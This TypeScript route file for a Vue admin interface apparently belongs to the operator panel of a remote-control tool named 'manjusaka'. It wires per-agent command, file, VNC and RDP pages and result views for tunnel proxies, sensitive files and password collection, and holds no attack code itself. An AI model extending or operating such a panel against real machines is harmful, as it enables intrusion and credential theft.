import type { AppRouteModule } from "/@/router/types";
import { LAYOUT } from "/@/router/constant";
const IFrame = () => import('/@/views/sys/iframe/FrameBlank.vue');

const routes: AppRouteModule = {
    path: "/manjusaka",
    redirect: "/agents",
    component: LAYOUT,
    meta: {
      hideChildrenInMenu: false,
      title: "☘️牛屎花",
    },
    children: [{
          path: "/agentwork/:id",
          name: "AgentWork",
          component: () => import("/@/views/manjusaka/agents/work.vue"),
          meta: {hideMenu: true},
      },{
          path: "/agentfile/:id",
          name: "AgentFile",
          component: () => import("/@/views/manjusaka/agents/works/file.vue"),
          meta: {hideMenu: true},
      },{
          path: "/agentcmd/:id",
          name: "AgentCmd",
          component: () => import("/@/views/manjusaka/agents/works/cmd.vue"),
          meta: {hideMenu: true},
      },{
          path: "/agentvnc/:id",
          name: "AgentVnc",
          component: () => import("/@/views/manjusaka/agents/works/vnc.vue"),
          meta: {hideMenu: true},
      },{
          path: "/agentrdp/:id",
          name: "AgentRdp",
          component: () => import("/@/views/manjusaka/agents/works/rdp.vue"),
          meta: {hideMenu: true},
      },{
          path: "/agentaichat/:id",
          name: "AgentAiChat",
          component: () => import("/@/views/manjusaka/agents/works/aichat.vue"),
          meta: {hideMenu: true},
      },{
          path: "/agents",
          name: "AgentList",
          component: () => import("/@/views/manjusaka/agents/index.vue"),
          meta: { title:"☘️牛屎花" },
      },{
          path: "/proxyresult",
          name: "ProxyResult",
          component: () => import("/@/views/manjusaka/proxys/index.vue"),
          meta: {title: "隧道代理",}
      },{
          path: "/fileresult",
          name: "FileResult",
          component: () => import("/@/views/manjusaka/fileresult/index.vue"),
          meta: {title: "敏感文件",}
      },{
          path: "/passresult",
          name: "PassResult",
          component: () => import("/@/views/manjusaka/passresult/index.vue"),
          meta: {title: "密码收集",}
      }]
  };

export default routes;
